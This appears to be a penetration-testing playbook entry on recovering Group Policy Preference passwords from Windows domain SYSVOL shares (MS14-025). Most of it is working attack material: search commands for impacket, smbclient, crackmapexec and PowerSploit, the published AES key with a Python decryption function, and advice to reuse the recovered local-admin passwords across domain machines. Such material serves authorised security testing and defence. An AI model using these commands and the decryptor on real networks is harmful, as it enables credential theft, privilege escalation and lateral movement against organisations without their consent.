---
id: windows-gpp-creds
title: GPP Credentials (MS14-025)
stage: privesc
tags: [windows, ad]
tools:
  - Get-GPPPassword (PowerSploit)
  - impacket-Get-GPPPassword domain/user:pass@$DC
  - findstr /S /I cpassword \\$DC\SYSVOL\*.xml
leads_to: [password-spray, system-shell, domain-admin]
summary: Retrieve and decrypt AES-encrypted passwords stored in Group Policy Preference XML files on SYSVOL — key is publicly known.
---

## What and Why

Group Policy Preferences (GPP) allowed admins to set local admin passwords, map drives, and create scheduled tasks — all stored in XML files on SYSVOL. Microsoft published the AES-256 key used to encrypt the `cpassword` field in 2012. MS14-025 (May 2014) patched new GPP creations but **did not remove existing cpassword entries** — they persist in SYSVOL indefinitely.

## Search SYSVOL from Linux

```bash
# With valid domain credentials
impacket-Get-GPPPassword domain.local/user:password@$DC

# Manual search via SMB
smbclient //DC/SYSVOL -U 'domain\user%password'
# Then: recurse; ls *.xml

# Or via CME
crackmapexec smb $DC -u user -p password -M gpp_password
crackmapexec smb $DC -u user -p password -M gpp_autologin
```

## Search SYSVOL from Windows

```powershell
# Search all XML files for cpassword
findstr /S /I cpassword \\$DC\SYSVOL\*.xml
findstr /S /I cpassword \\$DOMAIN\SYSVOL\*.xml

# PowerSploit
Import-Module .\PowerSploit.ps1
Get-GPPPassword
Get-GPPAutologon     # may contain autologin credentials
```

## Decrypt cpassword Manually

The AES key is `4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b3 54 1a` (32 bytes).

```python
import base64
from Crypto.Cipher import AES

def decrypt_gpp(cpassword):
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb3\x54\x1a'
    # Pad to multiple of 4 for base64
    pad = len(cpassword) % 4
    if pad: cpassword += '=' * (4 - pad)
    data = base64.b64decode(cpassword)
    iv = b'\x00' * 16
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data).rstrip(b'\x00\x10').decode('utf-16-le')

print(decrypt_gpp("YOUR_CPASSWORD_VALUE"))
```

Or simply use `gpp-decrypt` (Kali):

```bash
gpp-decrypt <cpassword_value>
```

## Common GPP XML File Paths

```
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\User\Preferences\Drives\Drives.xml
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Services\Services.xml
\\DOMAIN\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

## Notes

- Passwords in GPP are usually **local administrator passwords** — try them against all domain machines
- Also check `Autologon` credentials in GPP — sometimes domain accounts stored here
- SYSVOL is readable by all authenticated domain users — no elevated access required to search it
- The patch (MS14-025) prevents new GPP passwords from being set but doesn't purge existing entries

